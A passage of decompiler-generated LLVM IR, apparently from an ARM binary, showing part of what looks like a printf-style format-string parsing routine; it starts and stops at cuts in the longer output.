  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12e94, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_12e74, { 1, 0 }
}

define i32 @function_12ea0(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12ea0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_4()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_4()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_12ea0 = load i32, i32* @r5, align 4
  %v9_12ea0 = load i32, i32* @r6, align 4
  %v12_12ea0 = load i32, i32* @r7, align 4
  %v18_12ea0 = load i32, i32* @sb, align 4
  %v21_12ea0 = load i32, i32* @sl, align 4
  %v24_12ea0 = load i32, i32* @fp, align 4
  %v2_12ea8 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_12ea8, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_12ea8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_12eb8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12eb8, i32* @r5, align 4
  %v2_12ebc = call i32 @function_13588(i32* nonnull %stack_var_-352)
  store i32 %v2_12ebc, i32* %r0.global-to-local, align 4
  %v1_12ec4 = icmp slt i32 %v2_12ebc, 0
  br i1 %v1_12ec4, label %dec_label_pc_12ed4, label %dec_label_pc_12f08

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12ea0
  %v3_12ed4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_12ed4, i32* @r4, align 4
  store i32 %v3_12ed4, i32* @r0, align 4
  %v0_12edc = call i32 @function_13f70()
  store i32 %v0_12edc, i32* %r0.global-to-local, align 4
  %v2_12ee0 = icmp eq i32 %v0_12edc, 0
  br i1 %v2_12ee0, label %bb, label %dec_label_pc_12ef0

bb:                                               ; preds = %dec_label_pc_12ed4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13558

dec_label_pc_12ef0:                               ; preds = %dec_label_pc_12ed4
  %v0_12ef0 = load i32, i32* @r4, align 4
  store i32 %v0_12ef0, i32* %r0.global-to-local, align 4
  %v0_12ef4 = load i32, i32* @fp, align 4
  store i32 %v0_12ef4, i32* %r2.global-to-local, align 4
  %v3_12ef8 = inttoptr i32 %v0_12ef4 to i16*
  %v4_12ef8 = call i32 @function_184e0(i32 %v0_12ef0, i32 %v0_12edc, i16* %v3_12ef8)
  store i32 %v4_12ef8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13558

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12ea0
  %v0_12f08 = load i32, i32* @r5, align 4
  store i32 %v2_12ea8, i32* %r0.global-to-local, align 4
  %v2_12f10 = call i32 @function_13628(i32 %v2_12ea8, i32 %v0_12f08)
  store i32 %v2_12f10, i32* %r0.global-to-local, align 4
  store i32 1852, i32* @ip, align 4
  %v0_12f58 = load i32, i32* @r4, align 4
  store i32 %v0_12f58, i32* %r2.global-to-local, align 4
  %v1_12fdc = bitcast i32* %stack_var_-352 to i8*
  %v4_12fec = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_12ff8 = ptrtoint i32* %stack_var_-272 to i32
  %v2_13010 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1302c = icmp eq i32 %tmp104, 0
  %v2_13364 = ptrtoint i32* %stack_var_-200 to i32
  %v2_133a8 = ptrtoint i32* %stack_var_-348 to i32
  %v2_133ac = ptrtoint i32* %stack_var_-72 to i32
  %v2_13260 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1326c = ptrtoint i32* %stack_var_-52 to i32
  %v7_130c8 = zext i8 %tmp102 to i32
  %v2_13100 = ptrtoint i32* %stack_var_-73 to i32
  %v1_13108 = bitcast i32* %stack_var_-73 to i8*
  %v2_13110 = icmp ugt i32 %tmp104, 4
  %v7_13110 = icmp eq i32 %tmp104, 5
  %v7_12ff4 = ptrtoint i32* %stack_var_-280 to i32
  %v5_13024195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_13234 = icmp ugt i32 %tmp104, 16
  %v7_13234 = icmp eq i32 %tmp104, 17
  %v2_13238 = xor i1 %v7_13234, true
  %v3_13238 = and i1 %v2_13234, %v2_13238
  %v2_132bc = icmp ugt i32 %tmp104, 18
  %v7_132bc = icmp eq i32 %tmp104, 19
  %v2_132c0 = xor i1 %v7_132bc, true
  %v3_132c0 = and i1 %v2_132bc, %v2_132c0
  %v7_13358 = icmp eq i32 %tmp104, 20
  %v1_13070 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_22c3c.712 to i32), i32 -1)
  %v2_13070 = inttoptr i32 %v1_13070 to i8*
  %v2_1309c = xor i1 %v7_13110, true
  %v3_1309c = and i1 %v2_13110, %v2_1309c
  %v7_130d0 = icmp eq i32 %tmp104, 1
  %v2_13118 = xor i1 %v2_13110, true
  %v3_13118 = or i1 %v7_13110, %v2_13118
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_13180 = icmp eq i32 %tmp104, 3
  %v11_1318c = icmp eq i32 %tmp104, 4
  %v9_12ffc = mul nuw nsw i32 %v4_12fec, 8
  %v10_12ffc = add i32 %v7_12ff4, %v9_12ffc
  br label %dec_label_pc_12f5c.outer

dec_label_pc_12f5c.outer:                         ; preds = %dec_label_pc_1353c, %dec_label_pc_12f08
  %v0_12f5c45 = phi i32 [ %v3_1353c, %dec_label_pc_1353c ], [ %v0_12f58, %dec_label_pc_12f08 ]
  %v0_13090 = phi i32 [ %stack_var_-336.4, %dec_label_pc_1353c ], [ %tmp103, %dec_label_pc_12f08 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_1353c ], [ 0, %dec_label_pc_12f08 ]
  br label %dec_label_pc_12f5c.outer36

dec_label_pc_12f5c.outer36:                       ; preds = %dec_label_pc_12f5c.outer, %dec_label_pc_13548
  %v0_12f5c44 = phi i32 [ %v0_12f5c45, %dec_label_pc_12f5c.outer ], [ %v1_13548, %dec_label_pc_13548 ]
  %v5_12f88 = phi i32 [ %v0_12f5c45, %dec_label_pc_12f5c.outer ], [ %v1_12fb8, %dec_label_pc_13548 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_12f5c.outer ], [ %v1_13428, %dec_label_pc_13548 ]
  %v1_12f5c188 = inttoptr i32 %v0_12f5c44 to i8*
  %v2_12f5c189 = load i8, i8* %v1_12f5c188, align 1
  %v2_12f60191 = icmp eq i8 %v2_12f5c189, 0
  br i1 %v2_12f60191, label %dec_label_pc_12f78, label %bb138

bb138:                                            ; preds = %dec_label_pc_12f5c.outer36, %.thread6
  %v2_12f5c193 = phi i8 [ %v2_12f5c, %.thread6 ], [ %v2_12f5c189, %dec_label_pc_12f5c.outer36 ]
  %v1_12f70192 = phi i32 [ %v2_12f70, %.thread6 ], [ %v0_12f5c44, %dec_label_pc_12f5c.outer36 ]
  %v8_12f64 = icmp eq i8 %v2_12f5c193, 37
  br i1 %v8_12f64, label %dec_label_pc_12f78, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12f70 = add i32 %v1_12f70192, 1
  store i32 %v2_12f70, i32* @r4, align 4
  %v1_12f5c = inttoptr i32 %v2_12f70 to i8*
  %v2_12f5c = load i8, i8* %v1_12f5c, align 1
  %v2_12f60 = icmp eq i8 %v2_12f5c, 0
  br i1 %v2_12f60, label %dec_label_pc_12f78, label %bb138

dec_label_pc_12f78:                               ; preds = %bb138, %.thread6, %dec_label_pc_12f5c.outer36
  %v1_12f70.lcssa = phi i32 [ %v0_12f5c44, %dec_label_pc_12f5c.outer36 ], [ %v2_12f70, %.thread6 ], [ %v1_12f70192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12f78 = sub i32 %v1_12f70.lcssa, %v5_12f88
  %v9_12f78 = icmp eq i32 %v1_12f70.lcssa, %v5_12f88
  br i1 %v9_12f78, label %dec_label_pc_12fac, label %dec_label_pc_12f80

dec_label_pc_12f80:                               ; preds = %dec_label_pc_12f78
  store i32 %v2_12f78, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_12f78, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_12f80
  store i32 %v5_12f88, i32* %r0.global-to-local, align 4
  %v5_12f90 = load i32, i32* @fp, align 4
  store i32 %v5_12f90, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_12f80, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_12f80 ]
  store i32 77720, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_184e0.701 to i32))
  %v0_12f98 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f98 = load i32, i32* @r5, align 4
  %v9_12f98 = icmp eq i32 %v0_12f98, %v1_12f98
  br i1 %v9_12f98, label %dec_label_pc_12fa0, label %dec_label_pc_13550

dec_label_pc_12fa0:                               ; preds = %bb142
  %v2_12fa4 = add i32 %v0_12f98, %stack_var_-356.1.ph37
  store i32 %v2_12fa4, i32* @ip, align 4
  %v0_12fac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12fac

dec_label_pc_12fac:                               ; preds = %dec_label_pc_12f78, %dec_label_pc_12fa0
  %v0_12fc0 = phi i32 [ %v5_12f88, %dec_label_pc_12f78 ], [ %v0_12fac.pre, %dec_label_pc_12fa0 ]
  %v1_13428 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_12f78 ], [ %v2_12fa4, %dec_label_pc_12fa0 ]
  %v1_12fac = inttoptr i32 %v0_12fc0 to i8*
  %v2_12fac = load i8, i8* %v1_12fac, align 1
  %v2_12fb0 = icmp eq i8 %v2_12fac, 0
  br i1 %v2_12fb0, label %dec_label_pc_13558, label %dec_label_pc_12fb8

dec_label_pc_12fb8:                               ; preds = %dec_label_pc_12fac
  %v1_12fb8 = add i32 %v0_12fc0, 1
  %v2_12fb8 = inttoptr i32 %v1_12fb8 to i8*
  %v3_12fb8 = load i8, i8* %v2_12fb8, align 1
  %v7_12fbc = icmp eq i8 %v3_12fb8, 37
  store i32 %v1_12fb8, i32* %r2.global-to-local, align 4
  br i1 %v7_12fbc, label %dec_label_pc_13548, label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12fb8
  store i32 %v2_12ea8, i32* @r4, align 4
  store i32 %v2_12ea8, i32* %r0.global-to-local, align 4
  store i32 %v1_12fb8, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_12fdc = call i32 @function_13870(i8* %v1_12fdc)
  store i32 %v2_12ea8, i32* @r0, align 4
  %v0_12fe4 = call i32 @function_1366c()
  store i32 %v0_12fe4, i32* %r0.global-to-local, align 4
  store i32 %v4_12fec, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_12fc8
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_12fc8, %bb145
  %storemerge = phi i32 [ %v10_12ffc, %bb145 ], [ %v7_12ff8, %dec_label_pc_12fc8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_13024195, label %dec_label_pc_13008, label %dec_label_pc_13028

dec_label_pc_13008:                               ; preds = %bb146, %dec_label_pc_13008
  %v5_13014197 = phi i32 [ %v5_13014, %dec_label_pc_13008 ], [ %v2_13010, %bb146 ]
  %v0_13008196 = phi i32 [ %v1_1300c, %dec_label_pc_13008 ], [ %storemerge, %bb146 ]
  %v2_13008 = add i32 %v5_13014197, -32
  %v3_13008 = inttoptr i32 %v2_13008 to i32*
  store i32 %v0_13008196, i32* %v3_13008, align 4
  %v0_1300c = load i32, i32* %r0.global-to-local, align 4
  %v1_1300c = add i32 %v0_1300c, 8
  store i32 %v1_1300c, i32* %r0.global-to-local, align 4
  %v1_13014.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13014 = mul i32 %v1_13014.pre, 4
  %v5_13014 = add i32 %v4_13014, %v2_13010
  %v1_13020 = add i32 %v1_13014.pre, 1
  store i32 %v1_13020, i32* %r2.global-to-local, align 4
  %v5_13024 = icmp slt i32 %v1_13014.pre, %tmp105
  br i1 %v5_13024, label %dec_label_pc_13008, label %dec_label_pc_13028

dec_label_pc_13028:                               ; preds = %dec_label_pc_13008, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_1302c, label %dec_label_pc_13034, label %dec_label_pc_13058

dec_label_pc_13034:                               ; preds = %dec_label_pc_13028
  %v3_13034 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_13428, i32* @ip, align 4
  %v1_13040 = inttoptr i32 %v3_13034 to i32*
  %v2_13040 = load i32, i32* %v1_13040, align 4
  store i32 %v2_13040, i32* %r0.global-to-local, align 4
  %v1_13044 = and i32 %v0_13090, 3840
  store i32 %v1_13428, i32* %r2.global-to-local, align 4
  %v3_1304c = ashr i32 %v1_13428, 31
  %v4_13050 = inttoptr i32 %v2_13040 to i16*
  %v5_13050 = call i32 @function_18760(i16* %v4_13050, i32 %v1_13044, i32 %v1_13428, i32 %v3_1304c)
  store i32 %v5_13050, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_13058:                               ; preds = %dec_label_pc_13028
  br i1 %tmp207, label %dec_label_pc_131f4, label %dec_label_pc_13060

dec_label_pc_13060:                               ; preds = %dec_label_pc_13058
  %v3_13070 = load i8, i8* %v2_13070, align 1
  %v4_13070 = zext i8 %v3_13070 to i32
  store i32 %v4_13070, i32* @r4, align 4
  %v7_13074 = icmp eq i8 %v3_13070, 10
  br i1 %v7_13074, label %dec_label_pc_13080, label %bb147

bb147:                                            ; preds = %dec_label_pc_13060
  br label %bb151

dec_label_pc_13080:                               ; preds = %dec_label_pc_13060
  %v1_13090 = and i32 %v0_13090, 64
  %v2_13090 = icmp eq i32 %v1_13090, 0
  br i1 %v2_13090, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_13080
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_13080, %bb150
  br i1 %v3_1309c, label %.thread, label %dec_label_pc_130a4

.thread:                                          ; preds = %bb151
  %v5_1309c = sub nsw i32 0, %v4_13070
  store i32 %v5_1309c, i32* @r4, align 4
  br label %dec_label_pc_130bc

dec_label_pc_130a4:                               ; preds = %bb151
  br i1 %v7_13180, label %bb152, label %dec_label_pc_130b0

bb152:                                            ; preds = %dec_label_pc_130a4
  br label %dec_label_pc_130bc

dec_label_pc_130b0:                               ; preds = %dec_label_pc_130a4
  br i1 %v7_130d0, label %dec_label_pc_130c0, label %dec_label_pc_130bc

dec_label_pc_130bc:                               ; preds = %.thread, %bb152, %dec_label_pc_130b0
  %v0_130e881 = phi i32 [ %v5_1309c, %.thread ], [ %v4_13070, %bb152 ], [ %v4_13070, %dec_label_pc_130b0 ]
  br label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %dec_label_pc_130b0, %dec_label_pc_130bc
  %v0_130e880 = phi i32 [ %v0_130e881, %dec_label_pc_130bc ], [ %v4_13070, %dec_label_pc_130b0 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_130bc ], [ 6, %dec_label_pc_130b0 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_130c0 = load i32, i32* %stack_var_-348, align 4
  %v1_130c4 = icmp slt i32 %v3_130c0, 0
  %v7_130c8. = select i1 %v1_130c4, i32 %v7_130c8, i32 32
  store i32 %v7_130c8., i32* @sb, align 4
  br i1 %v7_130d0, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_130c0
  store i32 %v2_13010, i32* %r2.global-to-local, align 4
  %v2_130d8 = load i32, i32* @ip, align 4
  %v5_130d8 = mul i32 %v2_130d8, 4
  %v6_130d8 = add i32 %v5_130d8, %v2_13010
  %v2_130dc = add i32 %v6_130d8, -276
  %v3_130dc = inttoptr i32 %v2_130dc to i32*
  %v4_130dc = load i32, i32* %v3_130dc, align 4
  %v2_130e4 = and i32 %v4_130dc, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_130c0, %.thread15
  %storemerge93 = phi i32 [ %v2_130e4, %.thread15 ], [ 1024, %dec_label_pc_130c0 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_130e880, i32* @r2, align 4
  %v3_130ec = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_130ec, i32* @r1, align 4
  %v0_130f0 = call i32 @function_186f0()
  store i32 %v0_130f0, i32* @r2, align 4
  %v0_130fc = load i32, i32* @r1, align 4
  store i32 %v0_130fc, i32* @r3, align 4
  store i32 %v2_13100, i32* %r0.global-to-local, align 4
  %v2_13108 = call i32 @function_1878c(i8* %v1_13108)
  store i32 %v2_13108, i32* %r0.global-to-local, align 4
  store i32 %v2_13108, i32* @r4, align 4
  br i1 %v3_13118, label %bb160, label %dec_label_pc_1311c

dec_label_pc_1311c:                               ; preds = %bb157
  %v3_13108 = inttoptr i32 %v2_13108 to i8*
  %v3_1311c = load i8, i8* %v3_13108, align 1
  %v7_13120 = icmp eq i8 %v3_1311c, 45
  %v2_13128 = or i32 %v0_13090, 2
  %v2_13128.stack_var_-336.0 = select i1 %v7_13120, i32 %v2_13128, i32 %v0_13090
  br i1 %v7_13120, label %.thread17, label %dec_label_pc_1313c

.thread17:                                        ; preds = %dec_label_pc_1311c
  %v3_1312c = add i32 %v2_13108, 1
  store i32 %v3_1312c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_1313c:                               ; preds = %dec_label_pc_1311c
  %v1_1313c = and i32 %v2_13128.stack_var_-336.0, 2
  %v2_1313c = icmp eq i32 %v1_1313c, 0
  br i1 %v2_1313c, label %dec_label_pc_13148, label %bb158

bb158:                                            ; preds = %dec_label_pc_1313c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_13148:                               ; preds = %dec_label_pc_1313c
  %v1_13148 = urem i32 %v2_13128.stack_var_-336.0, 2
  %v2_13148 = icmp eq i32 %v1_13148, 0
  br i1 %v2_13148, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_13148
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_13148, %bb159
  %v0_131a4 = phi i32 [ %v2_13108, %bb157 ], [ %v3_1312c, %.thread17 ], [ %v2_13108, %dec_label_pc_13148 ], [ %v2_13108, %bb159 ], [ %v2_13108, %bb158 ]
  %v0_13160 = phi i32 [ %v0_13090, %bb157 ], [ %v2_13128, %.thread17 ], [ %v0_13090, %dec_label_pc_13148 ], [ %v0_13090, %bb159 ], [ %v0_13090, %bb158 ]
  %v3_13150 = load i32, i32* %stack_var_-348, align 4
  %v1_13158 = icmp slt i32 %v3_13150, 0
  br i1 %v1_13158, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_13150, %bb160 ]
  %v0_13188 = phi i32 [ 1, %bb161 ], [ %v3_13150, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_13160 = and i32 %v0_13160, 16
  %v2_13160 = icmp eq i32 %v1_13160, 0
  %v2_1316c = sub i32 %v2_13100, %v0_131a4
  store i32 %v2_1316c, i32* @r5, align 4
  br i1 %v2_13160, label %bb169, label %dec_label_pc_13174

dec_label_pc_13174:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_13174
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_13174, %bb163
  br i1 %v7_13180, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_13188, %v2_1316c
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_1318c, label %dec_label_pc_13194, label %bb169

dec_label_pc_13194:                               ; preds = %bb167
  %v1_13194 = inttoptr i32 %v0_131a4 to i8*
  %v2_13194 = load i8, i8* %v1_13194, align 1
  %v7_13198 = icmp eq i8 %v2_13194, 48
  br i1 %v7_13198, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_13194
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_13194
  %v2_131a0 = add i32 %v2_1316c, 1
  store i32 %v2_131a0, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_131e4 = phi i32 [ %v0_13188, %bb167 ], [ %v0_13188, %bb162 ], [ 1, %bb168 ], [ %v2_131a0, %.thread24 ], [ %v0_13188, %bb166 ]
  %v1_131a4 = inttoptr i32 %v0_131a4 to i8*
  %v2_131a4 = load i8, i8* %v1_131a4, align 1
  %v7_131a8 = icmp eq i8 %v2_131a4, 48
  br i1 %v7_131a8, label %dec_label_pc_131b0, label %dec_label_pc_131e0

dec_label_pc_131b0:                               ; preds = %bb169
  %v0_131b4 = load i32, i32* @r6, align 4
  %v7_131b8 = icmp slt i32 %v0_131b4, 6
  br i1 %v7_131b8, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_131b0
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_131b0, %bb170
  br i1 %v7_130d0, label %.thread27, label %dec_label_pc_131d4

.thread27:                                        ; preds = %bb171
  store i32 180260, i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 142368, i32* @r4, align 4
  br label %dec_label_pc_131ec

dec_label_pc_131d4:                               ; preds = %bb171
  %v2_131d4 = icmp eq i32 %v5_131e4, 0
  br i1 %v2_131d4, label %bb172, label %dec_label_pc_131e0

bb172:                                            ; preds = %dec_label_pc_131d4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_131ec

dec_label_pc_131e0:                               ; preds = %dec_label_pc_131d4, %bb169
  %v2_131e0 = sub i32 %v5_131e4, %v2_1316c
  %tmp211 = icmp ugt i32 %v5_131e4, %v2_1316c
  br i1 %tmp211, label %.thread85, label %dec_label_pc_131ec

.thread85:                                        ; preds = %dec_label_pc_131e0
  store i32 %v2_131e0, i32* @r8, align 4
  br label %dec_label_pc_133f8thread-pre-split

dec_label_pc_131ec:                               ; preds = %dec_label_pc_131e0, %.thread27, %bb172
  %v1_133fc.pre205 = phi i32 [ %v2_1316c, %dec_label_pc_131e0 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_133f8thread-pre-split

dec_label_pc_131f4:                               ; preds = %dec_label_pc_13058
  br i1 %tmp208, label %dec_label_pc_13234, label %dec_label_pc_131fc

dec_label_pc_131fc:                               ; preds = %dec_label_pc_131f4
  %v3_1320c = load i32, i32* %stack_var_-72, align 4
  %v0_13210 = load i32, i32* @fp, align 4
  store i32 %v0_13210, i32* %r0.global-to-local, align 4
  %v1_13214 = inttoptr i32 %v3_1320c to i32*
  %v2_13214 = load i32, i32* %v1_13214, align 4
  store i32 %v2_13214, i32* %r2.global-to-local, align 4
  %v3_13214 = add i32 %v3_1320c, 4
  %v4_13214 = inttoptr i32 %v3_13214 to i32*
  %v5_13214 = load i32, i32* %v4_13214, align 4
  %v6_13218 = inttoptr i32 %v5_13214 to i32*
  %v7_13218 = call i32 @function_188e8(i32 %v0_13210, i32 77340, i32 %v2_13214, i32* %v6_13218, i32 %v2_133a8, i32 77340)
  store i32 %v7_13218, i32* %r0.global-to-local, align 4
  %v1_1321c = icmp slt i32 %v7_13218, 0
  br i1 %v1_1321c, label %dec_label_pc_13550, label %dec_label_pc_13224

dec_label_pc_13224:                               ; preds = %dec_label_pc_131fc
  %v2_13228 = add i32 %v7_13218, %v1_13428
  store i32 %v2_13228, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_13234:                               ; preds = %dec_label_pc_131f4
  br i1 %v3_13238, label %dec_label_pc_132bc, label %dec_label_pc_1323c

dec_label_pc_1323c:                               ; preds = %dec_label_pc_13234
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_13244 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_13244, i32* %r0.global-to-local, align 4
  br i1 %v7_13234, label %dec_label_pc_1324c, label %dec_label_pc_13284

dec_label_pc_1324c:                               ; preds = %dec_label_pc_1323c
  %v1_1324c = inttoptr i32 %v3_13244 to i32*
  %v2_1324c = load i32, i32* %v1_1324c, align 4
  %v9_13250 = icmp eq i32 %v2_1324c, 0
  store i32 %v2_1324c, i32* %stack_var_-44, align 4
  br i1 %v9_13250, label %dec_label_pc_132fc, label %dec_label_pc_1325c

dec_label_pc_1325c:                               ; preds = %dec_label_pc_1324c
  %v3_1325c = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_13260, i32* @r0, align 4
  %v4_13264 = ashr i32 %v3_1325c, 31
  %v5_13264 = or i32 %v4_13264, %v3_1325c
  store i32 %v5_13264, i32* %r2.global-to-local, align 4
  store i32 %v2_13260, i32* @r1, align 4
  %v6_13270 = call i32 @function_17e4c(i32 %v2_13260, i32 %v2_13260, i32 %v5_13264, i32 %v2_1326c, i32 0, i32 %v2_1324c)
  store i32 %v6_13270, i32* %r0.global-to-local, align 4
  %v3_13274 = icmp eq i32 %v6_13270, -1
  store i32 %v6_13270, i32* @r5, align 4
  br i1 %v3_13274, label %dec_label_pc_13550, label %dec_label_pc_133e8

dec_label_pc_13284:                               ; preds = %dec_label_pc_1323c
  store i32 %v2_13364, i32* %r7.global-to-local, align 4
  %v1_13288 = inttoptr i32 %v3_13244 to i32*
  %v2_13288 = load i32, i32* %v1_13288, align 4
  store i32 %v2_1326c, i32* %r2.global-to-local, align 4
  store i32 %v2_13364, i32* %r0.global-to-local, align 4
  %v5_13294 = call i32 @function_17df8(i32 %v2_13364, i32 %v2_13288, i32 %v2_1326c, i32 %tmp105, i32 0)
  store i32 %v5_13294, i32* %r0.global-to-local, align 4
  %v7_13298 = icmp eq i32 %v5_13294, -1
  store i32 %v5_13294, i32* @r5, align 4
  br i1 %v7_13298, label %dec_label_pc_13550, label %dec_label_pc_132a4

dec_label_pc_132a4:                               ; preds = %dec_label_pc_13284
  %v0_132a4 = load i32, i32* @sl, align 4
  store i32 %v0_132a4, i32* @r8, align 4
  store i32 %v2_13364, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_132b4 = trunc i32 %v0_132a4 to i8
  %v2_132b4 = load i32, i32* %r7.global-to-local, align 4
  %v4_132b4 = add i32 %v2_132b4, %v5_13294
  %v5_132b4 = inttoptr i32 %v4_132b4 to i8*
  store i8 %v1_132b4, i8* %v5_132b4, align 1
  %v0_133fc.pre.pre = load i32, i32* @r8, align 4
  %v1_133fc.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_133f8thread-pre-split

dec_label_pc_132bc:                               ; preds = %dec_label_pc_13234
  br i1 %v3_132c0, label %dec_label_pc_13358, label %dec_label_pc_132c4

dec_label_pc_132c4:                               ; preds = %dec_label_pc_132bc
  %v3_132c4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_132c4, i32* %r0.global-to-local, align 4
  %v1_132cc = inttoptr i32 %v3_132c4 to i32*
  %v2_132cc = load i32, i32* %v1_132cc, align 4
  br i1 %v7_132bc, label %dec_label_pc_132cc, label %dec_label_pc_13330

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132c4
  store i32 %v2_132cc, i32* @r4, align 4
  %v2_132d0 = icmp eq i32 %v2_132cc, 0
  br i1 %v2_132d0, label %dec_label_pc_132fc, label %dec_label_pc_132d8

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132cc, %dec_label_pc_13360
  %v0_132dc = phi i32 [ %v2_132cc, %dec_label_pc_132cc ], [ %v3_13370, %dec_label_pc_13360 ]
  %v3_132d8 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_132dc, i32* %r0.global-to-local, align 4
  %v4_132e0 = ashr i32 %v3_132d8, 31
  %v5_132e0 = or i32 %v4_132e0, %v3_132d8
